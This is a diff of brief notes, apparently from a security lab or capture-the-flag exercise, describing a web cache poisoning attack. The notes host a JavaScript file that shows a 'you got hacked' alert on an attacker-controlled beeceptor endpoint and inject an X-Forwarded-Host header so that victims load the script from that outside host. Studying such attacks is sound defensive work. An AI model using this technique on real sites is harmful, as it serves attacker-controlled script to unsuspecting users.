@@ -1,5 +1,5 @@
-upload this script on any host like beecebtor ,and edit config on beeceptor channge them conten-type to application/javascript
-and the pass make it called /app.js 
+upload this script on any host you own like beeceptor ,and edit config on beeceptor channge them content-type to application/javascript
+and the path make it called /app.js
 
 
 alert("Poisoned app.js loaded\nyou got hacked");
@@ -17,3 +17,7 @@ document.addEventListener("DOMContentLoaded", () => {
 ____________________________________________________
 
 in req add X-Forwarded-Host:untrusted-cdn.free.beeceptor.com or your host
+_________
+
+victim = trusted-cdn.free.beeceptor.com
+attacker = untrusted-cdn.free.beeceptor.com
